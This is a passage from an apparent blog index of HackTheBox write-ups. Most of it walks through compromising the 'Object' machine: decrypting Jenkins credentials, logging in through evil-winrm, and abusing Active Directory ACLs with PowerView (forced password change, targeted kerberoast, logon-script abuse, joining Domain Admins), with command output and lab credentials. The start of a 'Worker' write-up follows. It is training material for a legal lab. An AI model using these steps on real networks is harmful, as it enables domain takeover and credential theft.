\u0026lt;id\u0026gt;admin\u0026lt;/id\u0026gt; \u0026lt;fullName\u0026gt;admin\u0026lt;/fullName\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\u0026#34;credentials@2.6.1\u0026#34;\u0026gt; \u0026lt;domainCredentialsMap class=\u0026#34;hudson.util.CopyOnWriteMap$Hash\u0026#34;\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;com.cloudbees.plugins.credentials.domains.Domain\u0026gt; \u0026lt;specifications/\u0026gt; \u0026lt;/com.cloudbees.plugins.credentials.domains.Domain\u0026gt; \u0026lt;java.util.concurrent.CopyOnWriteArrayList\u0026gt; \u0026lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl\u0026gt; \u0026lt;id\u0026gt;320a60b9-1e5c-4399-8afe-44466c9cde9e\u0026lt;/id\u0026gt; \u0026lt;description\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;username\u0026gt;oliver\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}\u0026lt;/password\u0026gt; \u0026lt;usernameSecret\u0026gt;false\u0026lt;/usernameSecret\u0026gt; \u0026lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl\u0026gt; \u0026lt;/java.util.concurrent.CopyOnWriteArrayList\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;/domainCredentialsMap\u0026gt; \u0026lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty\u0026gt; \u0026lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\u0026#34;email-ext@2.84\u0026#34;\u0026gt; \u0026lt;triggers/\u0026gt; \u0026lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty\u0026gt; \u0026lt;hudson.model.MyViewsProperty\u0026gt; \u0026lt;views\u0026gt; \u0026lt;hudson.model.AllView\u0026gt; \u0026lt;owner class=\u0026#34;hudson.model.MyViewsProperty\u0026#34; reference=\u0026#34;../../..\u0026#34;/\u0026gt; \u0026lt;name\u0026gt;all\u0026lt;/name\u0026gt; \u0026lt;filterExecutors\u0026gt;false\u0026lt;/filterExecutors\u0026gt; \u0026lt;filterQueue\u0026gt;false\u0026lt;/filterQueue\u0026gt; \u0026lt;properties class=\u0026#34;hudson.model.View$PropertyList\u0026#34;/\u0026gt; \u0026lt;/hudson.model.AllView\u0026gt; \u0026lt;/views\u0026gt; \u0026lt;/hudson.model.MyViewsProperty\u0026gt; \u0026lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\u0026#34;display-url-api@2.3.5\u0026#34;\u0026gt; \u0026lt;providerId\u0026gt;default\u0026lt;/providerId\u0026gt; \u0026lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty\u0026gt; \u0026lt;hudson.model.PaneStatusProperties\u0026gt; \u0026lt;collapsed/\u0026gt; \u0026lt;/hudson.model.PaneStatusProperties\u0026gt; \u0026lt;jenkins.security.seed.UserSeedProperty\u0026gt; \u0026lt;seed\u0026gt;ea75b5bd80e4763e\u0026lt;/seed\u0026gt; \u0026lt;/jenkins.security.seed.UserSeedProperty\u0026gt; \u0026lt;hudson.search.UserSearchProperty\u0026gt; \u0026lt;insensitiveSearch\u0026gt;true\u0026lt;/insensitiveSearch\u0026gt; \u0026lt;/hudson.search.UserSearchProperty\u0026gt; \u0026lt;hudson.model.TimeZoneProperty/\u0026gt; \u0026lt;hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt; \u0026lt;passwordHash\u0026gt;#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW\u0026lt;/passwordHash\u0026gt; \u0026lt;/hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt; \u0026lt;hudson.tasks.Mailer_-UserProperty plugin=\u0026#34;mailer@1.34\u0026#34;\u0026gt; \u0026lt;emailAddress\u0026gt;admin@object.local\u0026lt;/emailAddress\u0026gt; \u0026lt;/hudson.tasks.Mailer_-UserProperty\u0026gt; \u0026lt;jenkins.security.ApiTokenProperty\u0026gt; \u0026lt;tokenStore\u0026gt; \u0026lt;tokenList/\u0026gt; \u0026lt;/tokenStore\u0026gt; \u0026lt;/jenkins.security.ApiTokenProperty\u0026gt; \u0026lt;jenkins.security.LastGrantedAuthoritiesProperty\u0026gt; \u0026lt;roles\u0026gt; \u0026lt;string\u0026gt;authenticated\u0026lt;/string\u0026gt; \u0026lt;/roles\u0026gt; \u0026lt;timestamp\u0026gt;1634793332195\u0026lt;/timestamp\u0026gt; \u0026lt;/jenkins.security.LastGrantedAuthoritiesProperty\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;/user\u0026gt; Now we need to get the master.key and hudson.util.Secret Both are located in secrets directory hudson.util.Secret is in binary format We need to convert to base64 to retrieve it Save them Now we use pwn_jenkins └─$ pwn_jenkins/offline_decryption/jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml c1cdfun_d2434 Let\u0026rsquo;s check if it\u0026rsquo;s valid oliver:c1cdfun_d2434 └─$ crackmapexec winrm 10.10.11.132 -u oliver -p c1cdfun_d2434 SMB 10.10.11.132 5985 NONE [*] None (name:10.10.11.132) (domain:None) HTTP 10.10.11.132 5985 NONE [*] http://10.10.11.132:5985/wsman WINRM 10.10.11.132 5985 NONE [+] None\\oliver:c1cdfun_d2434 (Pwn3d!) We got the shell └─$ evil-winrm -i 10.10.11.132 -u oliver -p \u0026#39;c1cdfun_d2434\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\oliver\\Documents\u0026gt; User #2 We have other users *Evil-WinRM* PS C:\\users\u0026gt; net users User accounts for \\\\ ------------------------------------------------------------------------------- Administrator Guest krbtgt maria oliver The command completed with one or more errors. By looking at the open ports we could think that it\u0026rsquo;s a domain controller *Evil-WinRM* PS C:\\users\u0026gt; netstat -an | findstr LISTENING TCP 0.0.0.0:80 0.0.0.0:0 LISTENING TCP 0.0.0.0:88 0.0.0.0:0 LISTENING TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:389 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:464 0.0.0.0:0 LISTENING TCP 0.0.0.0:593 0.0.0.0:0 LISTENING TCP 0.0.0.0:636 0.0.0.0:0 LISTENING TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING TCP 0.0.0.0:49673 0.0.0.0:0 LISTENING TCP 0.0.0.0:49674 0.0.0.0:0 LISTENING TCP 0.0.0.0:49683 0.0.0.0:0 LISTENING TCP 0.0.0.0:49696 0.0.0.0:0 LISTENING TCP 0.0.0.0:54873 0.0.0.0:0 LISTENING TCP 10.10.11.132:53 0.0.0.0:0 LISTENING TCP 10.10.11.132:139 0.0.0.0:0 LISTENING TCP 127.0.0.1:53 0.0.0.0:0 LISTENING TCP [::]:80 [::]:0 LISTENING TCP [::]:88 [::]:0 LISTENING TCP [::]:135 [::]:0 LISTENING ... Let\u0026rsquo;s launch bloodhound *Evil-WinRM* PS C:\\users\\oliver\\documents\u0026gt; upload SharpHound.exe Info: Uploading SharpHound.exe to C:\\users\\oliver\\documents\\SharpHound.exe Data: 1402196 bytes of 1402196 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\users\\oliver\\documents\u0026gt; .\\Sharphound.exe -c All 2023-09-10T05:43:21.4997147-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound 2023-09-10T05:43:21.6871611-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-09-10T05:43:21.7184292-07:00|INFORMATION|Initializing SharpHound at 5:43 AM on 9/10/2023 2023-09-10T05:43:21.8746420-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-09-10T05:43:22.0778650-07:00|INFORMATION|Beginning LDAP search for object.local 2023-09-10T05:43:22.1246657-07:00|INFORMATION|Producer has finished, closing LDAP channel 2023-09-10T05:43:22.1402754-07:00|INFORMATION|LDAP channel closed, waiting for consumers 2023-09-10T05:43:52.7809247-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM 2023-09-10T05:44:07.7027667-07:00|INFORMATION|Consumers finished, closing output channel 2023-09-10T05:44:07.7340274-07:00|INFORMATION|Output channel closed, waiting for output task to complete Closing writers 2023-09-10T05:44:07.8121376-07:00|INFORMATION|Status: 92 objects finished (+92 2.044445)/s -- Using 41 MB RAM 2023-09-10T05:44:07.8121376-07:00|INFORMATION|Enumeration finished in 00:00:45.7466536 2023-09-10T05:44:07.9058952-07:00|INFORMATION|Saving cache with stats: 52 ID to type mappings. 52 name to SID mappings. 0 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-09-10T05:44:07.9058952-07:00|INFORMATION|SharpHound Enumeration Completed at 5:44 AM on 9/10/2023! Happy Graphing! *Evil-WinRM* PS C:\\users\\oliver\\documents\u0026gt; download 20230910054407_BloodHound.zip Info: Downloading C:\\users\\oliver\\documents\\20230910054407_BloodHound.zip to 20230910054407_BloodHound.zip Info: Download successful! We have a ForceChangePassword over smith We can change it using Powerview Let\u0026rsquo;s upload it *Evil-WinRM* PS C:\\Programdata\u0026gt; upload powerview.ps1 Info: Uploading powerview.ps1 to C:\\Programdata\\powerview.ps1 Data: 1027036 bytes of 1027036 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Programdata\u0026gt; import-module .\\powerview.ps1 *Evil-WinRM* PS C:\\Programdata\u0026gt; $password = ConvertTo-SecureString \u0026#39;P@ssw0rd!@#\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Programdata\u0026gt; Set-DomainUserPassword -Identity smith -AccountPassword $password *Evil-WinRM* PS C:\\Programdata\u0026gt; Now we can winrm as smith └─$ evil-winrm -i 10.10.11.132 -u smith -p \u0026#39;P@ssw0rd!@#\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\smith\\Documents\u0026gt; User #3 smith has GenericWrite over maria A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket. Let\u0026rsquo;s set SPN for maria and get her hash We can use Set-DomainObject from Powerview or setspn -a nonexistent/BLAHBLAH object.local\\maria *Evil-WinRM* PS C:\\programdata\u0026gt; import-module .\\powerview.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; Set-DomainObject -Identity maria -SET @{serviceprincipalname=\u0026#39;nonexistent/BLAHBLAH\u0026#39;} *Evil-WinRM* PS C:\\programdata\u0026gt; Get-DomainUser maria logoncount : 39 badpasswordtime : 10/22/2021 5:54:46 AM distinguishedname : CN=maria garcia,CN=Users,DC=object,DC=local objectclass : {top, person, organizationalPerson, user} displayname : maria garcia lastlogontimestamp : 9/10/2023 1:28:36 AM userprincipalname : maria@object.local name : maria garcia objectsid : S-1-5-21-4088429403-1159899800-2753317549-1106 samaccountname : maria codepage : 0 samaccounttype : USER_OBJECT accountexpires : NEVER countrycode : 0 whenchanged : 9/10/2023 1:02:22 PM instancetype : 4 usncreated : 20645 objectguid : 9340fcdd-2f1e-4f89-bafe-e1dcdd5c2b6f sn : garcia lastlogoff : 12/31/1600 4:00:00 PM objectcategory : CN=Person,CN=Schema,CN=Configuration,DC=object,DC=local dscorepropagationdata : {10/22/2021 10:21:48 AM, 10/22/2021 10:10:02 AM, 10/22/2021 10:04:25 AM, 10/22/2021 9:52:43 AM...} serviceprincipalname : nonexistent/BLAHBLAH givenname : maria memberof : CN=Remote Management Users,CN=Builtin,DC=object,DC=local lastlogon : 9/10/2023 1:28:36 AM badpwdcount : 0 cn : maria garcia useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD whencreated : 10/22/2021 4:16:32 AM primarygroupid : 513 pwdlastset : 10/21/2021 9:16:32 PM usnchanged : 159969 Now let\u0026rsquo;s get the hash But it requires a credential object *Evil-WinRM* PS C:\\programdata\u0026gt; Get-DomainSPNTicket -SPN \u0026#34;nonexistent/BLAHBLAH\u0026#34; Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN \u0026#39;nonexistent/BLAHBLAH\u0026#39; from user \u0026#39;UNKNOWN\u0026#39; : Exception calling \u0026#34;.ctor\u0026#34; with \u0026#34;1\u0026#34; argument(s): \u0026#34;The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details.\u0026#34; Let\u0026rsquo;s generate one and run it again *Evil-WinRM* PS C:\\programdata\u0026gt; $password = ConvertTo-SecureString \u0026#39;P@ssw0rd!@#\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\programdata\u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#39;object.local\\smith\u0026#39;, $password) *Evil-WinRM* PS C:\\programdata\u0026gt; Get-DomainSPNTicket -SPN \u0026#34;nonexistent/BLAHBLAH\u0026#34; -Credential $creds Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work. Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: object.local\\smith SamAccountName : UNKNOWN DistinguishedName : UNKNOWN ServicePrincipalName : nonexistent/BLAHBLAH TicketByteHexStream : Hash : $krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$26C26D7F9C930DDD789233472D331123$25A8DDA3FA84C7C424C81471FA05EAC14A51D10C77146012CF2F1C092AA66ADB653D6644A47A42A4BAE661A28EDE88831DC91E81951E5D8A45389F0E325CB30159E47E95AF8760 62615187D1E69B63AC06437952B541896C8516018AFDBFC1995B10C302AF8B36A91732D52988E2FBC1F320241D23789A88BD6D66CAB6C937A1D5D6DFA5AC9861B1D1F5EFAB4F1C839AB3BEC8713C5831B340D368A017DB7C34A67DC4957463B50EA0EFAC54561635A452289F314FCF19A6 E71A9672A7BC5291BABE17958A54966A9EAD7FFD1A5FABFBAB4C410A843C746D20F6E4D661D18C93A3084A23171DD89329A3D33F9DDF8ED380F696B71913B87823F73AD67DE7B3D9987FA0D265AAA363235CC516D71CAFDFEB961A54F9F55123A527D4AC9E57D8A1191623A8234D60070F C121D4DC648D1B0F14B92C91E355F3A469D03E5C6FE426178ECDD1F83C2A7306B1D91397E8553957D51015F7B580C140AF8566CFC4B92E20A00BEF8E0CDB474342183FFC7643F47F7DA687F3410DA7DE251BEB034AFB9B2AC8BAE3ABB73052FD7FD6618FCDB721E089B6671BA0A533D748 0B63A60D4D33C5B7C6C143BDC69D0FFFBEDF20E919DAFC367E75A338DB043DEDA5DCBCD9491640F93856F40676AA5CC62D8B7733599F01F72ACB7F0E49DCCF07B8EA6A56E7DE62D2357EB15A4D57EBC5BA381CDD2A051582E9E8CD66E715C88A11EB308FC7D1041AB1915E784F58AFB2A7 DC0DED4C6D777B06C885991EBD4B1778F83FFB2DDCAD681501CB9C63A40B2F9C3D374A87ACB4ACE7A25C400F46E7E8C8A5B988194ED720F1931E692FEFA388F45C173E6E688D5A6C8B1D5D01AF52F67637A4F47E5CBF8196D9C574AE0706F3E04BA602844A14E7C402063E313AA79829A1 EB9321271BFBEE69ED957A1683248A5958E2C988CF12BFFA88AF594EDD73EEF768A30575070184F05F2BD2E42BDA7F2F84F5B28CA9AD2A59F8824C4BC7D2ED96CE7C9F47578ED8D4CD53C18C4A6CE2EEA5C99B9CF86813A43A6132E926C03B1960BAB291C4FE8CCC3FF00E5CB942388121 D3E12599EC9E74A5052C55A7A9AD7593525F464AD95465FF5812E6C7A0C3378FF6B015EC4FAF2B06461F59D003B598C2F203A5BE5070675D9B2656FA9D997D4632E4A20C144314C87AD8EC61CB6045F9C11D81C0367E3F7A77D6B87411C0E6B7B56F5D3E213FBA99C6C813B28550929DA0 F401BA7FEE04A9FBFAE1778D1C48037968FEDAFBBB4EEDE75E394784896E4921DF7875DF8CB27009EF5656D78A0E6A6C503E032430D967DC1BFD5E6992649460CBF6D01BC69FAA696CAD4CA6C619DC1FE3C06BCC7F6BB73A0B625675CA9C60B4C442EF7E8598A1BE1EDF06E680845FC4F0 2A38BB5DE5084CB2DA01F956255A05860A4C8B5C7384D45D587D70B94F8DE89E6D95FFDB27EAF4BCAC9F0BBA01CB0EC804DCD7BB629568CE94B364F4F3180F0AE7695102B3AC503EDB28E85CED7D5B11E23AC1C4B5F9EC9CD5C8C25313 Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle But I couldn\u0026rsquo;t crack it Another way is to modify Logon Scripts https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericwrite-on-user https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user Let\u0026rsquo;s do it Note that we have a firewall, so we probably won\u0026rsquo;t be able to connect back *Evil-WinRM* PS C:\\programdata\u0026gt; echo \u0026#34;get-childitem -recurse c:\\users\\maria\\ -include *.txt,*.xml,*.xls \u0026gt; c:\\programdata\\out\u0026#34; \u0026gt; cmd.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; Set-DomainObject -Identity maria -SET @{scriptpath=\u0026#34;C:\\\\programdata\\\\cmd.ps1\u0026#34;} *Evil-WinRM* PS C:\\programdata\u0026gt; ls Directory: C:\\programdata Mode LastWriteTime Length Name ---- ------------- ------ ---- d---s- 10/21/2021 3:13 AM Microsoft d----- 10/21/2021 12:05 AM regid.1991-06.com.microsoft d----- 9/15/2018 12:19 AM SoftwareDistribution d----- 4/10/2020 5:48 AM ssh d----- 4/10/2020 10:49 AM USOPrivate d----- 4/10/2020 10:49 AM USOShared d----- 8/25/2021 2:57 AM VMware -a---- 9/10/2023 6:17 AM 178 cmd.ps1 -a---- 9/10/2023 6:11 AM 45272 nc64.exe -a---- 9/10/2023 6:17 AM 830 out -a---- 9/10/2023 5:52 AM 770279 powerview.ps1 -a---- 9/10/2023 5:42 AM 1051648 SharpHound.exe -a---- 9/10/2023 6:14 AM 98 shell.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; type out Directory: C:\\users\\maria\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/26/2021 8:13 AM 6144 Engines.xls We have an interesting file Engines.xls Let\u0026rsquo;s download it *Evil-WinRM* PS C:\\programdata\u0026gt; echo \u0026#34;copy C:\\users\\maria\\Desktop\\Engines.xls c:\\programdata\u0026#34; \u0026gt; cmd.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; ls Directory: C:\\programdata Mode LastWriteTime Length Name ---- ------------- ------ ---- d---s- 10/21/2021 3:13 AM Microsoft d----- 10/21/2021 12:05 AM regid.1991-06.com.microsoft d----- 9/15/2018 12:19 AM SoftwareDistribution d----- 4/10/2020 5:48 AM ssh d----- 4/10/2020 10:49 AM USOPrivate d----- 4/10/2020 10:49 AM USOShared d----- 8/25/2021 2:57 AM VMware -a---- 9/10/2023 6:19 AM 114 cmd.ps1 -a---- 10/26/2021 8:13 AM 6144 Engines.xls -a---- 9/10/2023 6:11 AM 45272 nc64.exe -a---- 9/10/2023 6:19 AM 830 out -a---- 9/10/2023 5:52 AM 770279 powerview.ps1 -a---- 9/10/2023 5:42 AM 1051648 SharpHound.exe -a---- 9/10/2023 6:14 AM 98 shell.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; download Engines.xls Info: Downloading C:\\programdata\\Engines.xls to Engines.xls Info: Download successful! We have a few creds Pass them to crackmapexec └─$ crackmapexec winrm 10.10.11.132 -u maria -p passwords.list SMB 10.10.11.132 5985 NONE [*] None (name:10.10.11.132) (domain:None) HTTP 10.10.11.132 5985 NONE [*] http://10.10.11.132:5985/wsman WINRM 10.10.11.132 5985 NONE [-] None\\maria:d34gb8@ WINRM 10.10.11.132 5985 NONE [-] None\\maria:0de_434_d545 WINRM 10.10.11.132 5985 NONE [+] None\\maria:W3llcr4ft3d_4cls (Pwn3d!) We found the creds: maria:W3llcr4ft3d_4cls └─$ evil-winrm -i 10.10.11.132 -u maria -p \u0026#39;W3llcr4ft3d_4cls\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\maria\\Documents\u0026gt; Root I ran bloodhound again I noticed that we have to run it every time we get new creds to get more info Now we can see that maria has WriteOwner over Domain Admins group We can set the owner to maria and add her to the group https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#writeowner-on-group https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#writedacl-+-writeowner *Evil-WinRM* PS C:\\programdata\u0026gt; import-module .\\powerview.ps1 *Evil-WinRM* PS C:\\programdata\u0026gt; Set-DomainObjectOwner -Identity \u0026#39;Domain Admins\u0026#39; -OwnerIdentity \u0026#39;maria\u0026#39; *Evil-WinRM* PS C:\\programdata\u0026gt; Add-DomainObjectAcl -TargetIdentity \u0026#34;Domain Admins\u0026#34; -PrincipalIdentity maria -Rights All *Evil-WinRM* PS C:\\programdata\u0026gt; Add-DomainGroupMember -Identity \u0026#39;Domain Admins\u0026#39; -Members \u0026#39;maria\u0026#39; *Evil-WinRM* PS C:\\programdata\u0026gt; net user maria User name maria Full Name maria garcia Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 10/21/2021 9:16:32 PM Password expires Never Password changeable 10/22/2021 9:16:32 PM Password required Yes User may change password Yes Workstations allowed All Logon script C:\\\\programdata\\\\cmd.ps1 User profile Home directory Last logon 9/10/2023 6:24:42 AM Logon hours allowed All Local Group Memberships *Remote Management Use Global Group memberships *Domain Admins *Domain Users The command completed successfully. We need to relogin to update our session You should always need to re-authenticate in order for the user\u0026rsquo;s security token to contain the new group membership. *Evil-WinRM* PS C:\\Users\\maria\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================= ================ ============================================= =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group OBJECT\\Domain Admins Group S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group OBJECT\\Denied RODC Password Replication Group Alias S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 ","date":"September 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/object/images/object.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/object/","summary":"Object Enumeration nmap └─$ nmap -Pn -p- 10.10.11.132 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 09:35 BST Nmap scan report for 10.10.11.132 (10.10.11.132) Host is up (0.092s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 5985/tcp open wsman 8080/tcp open http-proxy └─$ nmap -Pn -p80,5985,8080 -sC -sV 10.10.11.132 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 09:38 BST Nmap scan report for 10.","tags":["HTB","iis","wfuzz","jenkins","cicd","firewall","windows-firewall","jenkins-credential-decryptor","pwn-jenkins","evil-winrm","crackmapexec","bloodhound","sharphound","active-directory","github","forcechangepassword","genericwrite","writeowner","logon-script","powerview","scheduled-task","powershell"],"title":"[HTB] Machine: Object"},{"categories":null,"contents":"Worker Enumeration nmap └─$ nmap -Pn -p- 10.10.10.203 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 18:39 BST Nmap scan report for 10.10.10.203 (10.10.10.203) Host is up (0.098s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3690/tcp open svn 5985/tcp open wsman └─$ nmap -Pn -p80,3690,5985 -sC -sV 10.10.10.203 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 18:42 BST Nmap scan report for 10.10.10.203 (10.10.10.203) Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 3690/tcp open svnserve Subversion 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.203/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.203/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,asp,aspx [+] Timeout: 10s =============================================================== 2023/09/10 18:47:29 Starting gobuster in directory enumeration mode =============================================================== =============================================================== 2023/09/10 18:48:34 Finished =============================================================== Foothold We have svn on port 3690 https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server └─$ svn log svn://10.10.10.203 ------------------------------------------------------------------------ r5 | nathen | 2020-06-20 14:52:00 +0100 (Sat, 20 Jun 2020) | 1 line Added note that repo has been migrated ------------------------------------------------------------------------ r4 | nathen | 2020-06-20 14:50:20 +0100 (Sat, 20 Jun 2020) | 1 line Moving this repo to our new devops server which will handle the deployment for us ------------------------------------------------------------------------ r3 | nathen | 2020-06-20 14:46:19 +0100 (Sat, 20 Jun 2020) | 1 line - ------------------------------------------------------------------------ r2 | nathen | 2020-06-20 14:45:16 +0100 (Sat, 20 Jun 2020) | 1 line Added deployment script ------------------------------------------------------------------------ r1 | nathen | 2020-06-20 14:43:43 +0100 (Sat, 20 Jun 2020) | 1 line First version ------------------------------------------------------------------------ Let\u0026rsquo;s download the repo └─$ svn checkout svn://10.10.10.203 A dimension.worker.htb A dimension.worker.htb/LICENSE.txt A dimension.worker.htb/README.txt A dimension.worker.htb/assets A dimension.worker.htb/assets/css A dimension.worker.htb/assets/css/font ... └─$ ls -lha total 20K drwxr-xr-x 4 kali kali 4.0K Sep 10 18:58 . drwxr-xr-x 19 kali kali 4.0K Sep 10 18:58 .. drwxr-xr-x 4 kali kali 4.0K Sep 10 18:58 dimension.worker.htb -rw-r--r-- 1 kali kali 162 Sep 10 18:58 moved.txt drwxr-xr-x 4 kali kali 4.0K Sep 10 18:58 .svn If we check moved.txt └─$ cat moved.txt This repository has been migrated and will no longer be maintaned here. You can find the latest version at: http://devops.worker.htb // The Worker team :) We also saw r2 commit from the logs about Added deployment script We could have a creds there But I\u0026rsquo;ll start from the r1 └─$ svn up -r1 Updating \u0026#39;.\u0026#39;: D moved.txt Updated to revision 1. └─$ svn up -r2 Updating \u0026#39;.\u0026#39;: A deploy.ps1 Updated to revision 2. We have creds in deploy.ps1 But they don\u0026rsquo;t work for winrm └─$ cat deploy.ps1 $user = \u0026#34;nathen\u0026#34; $plain = \u0026#34;wendel98\u0026#34; $pwd = ($plain | ConvertTo-SecureString) $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd $args = 